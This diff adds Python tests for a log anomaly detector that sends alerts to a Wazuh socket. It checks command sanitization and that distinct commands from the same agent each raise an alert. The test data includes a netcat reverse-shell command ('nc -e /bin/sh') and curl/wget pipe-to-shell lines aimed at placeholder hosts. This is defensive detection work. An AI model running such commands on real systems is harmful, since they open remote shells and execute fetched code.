@@ -65,6 +65,46 @@ def test_process_line_injects_alert_when_above_threshold(tmp_path: Path) -> None
         alert = json.loads(raw[len(QUEUE_PREFIX):])["anomaly_detector"]
         assert alert["agent_id"] == "007"
         assert alert["process_name"] == "nc"
+        # The command is enriched into the alert, already sanitized.
+        assert alert["command"].startswith("nc -e /bin/sh")
+        assert "8.8.8.8" not in alert["command"]
+    finally:
+        server.close()
+
+
+def test_process_line_does_not_collide_distinct_commands(tmp_path: Path) -> None:
+    """Two different anomalous commands (same agent/process) must both alert."""
+    socket_path = str(tmp_path / "queue")
+    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+    server.bind(socket_path)
+    server.settimeout(0.2)
+    try:
+        model = LogAutoencoder()
+        model.eval()
+        injector = WazuhSocketInjector(socket_path)
+        recent: dict = {}
+
+        def run(command: str) -> None:
+            line = json.dumps(
+                {"agent": {"id": "007"}, "data": {"command": command, "process_name": "bash"}}
+            )
+            process_line(
+                line,
+                ISOSanitizer(),
+                LogVectorizer(),
+                model,
+                injector,
+                tau=-1.0,
+                scaler_mean=IDENTITY_MEAN,
+                scaler_var=IDENTITY_VAR,
+                recent_alerts=recent,
+                cooldown=1800.0,
+            )
+
+        run("curl http://host-a/x.sh | bash")
+        assert server.recv(65536)  # first command alerts
+        run("wget http://host-b/y.sh | sh")  # different command, same agent/process
+        assert server.recv(65536)  # must alert too — no signature collision
     finally:
         server.close()
 
